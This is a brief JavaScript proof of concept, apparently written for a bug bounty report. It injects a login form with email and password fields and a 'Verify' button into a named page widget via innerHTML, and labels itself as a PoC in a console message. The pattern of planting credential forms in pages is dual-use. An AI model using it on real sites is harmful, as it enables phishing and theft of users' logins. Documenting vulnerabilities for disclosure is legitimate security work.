(function() {
    const target = document.getElementById('livesearch-plp-widget');
    if (!target) return;

    // 使用反引号 (Backticks) 定义多行 HTML 模板
    const formTemplate = `
        <form action="https://auth.services.adobe.com/" method="post" autocomplete>
            <input type="email" name="email"  value="hecheng@wearehackerone.com" >
            <input type="password" name="password" autocomplete >
            <button type="submit" onclick="">Verify</button>
        </form>
    `;

    // 直接注入 HTML 字符串
    target.innerHTML = formTemplate;

    console.log("PoC Form injected via innerHTML into #livesearch-plp-widget");
})();
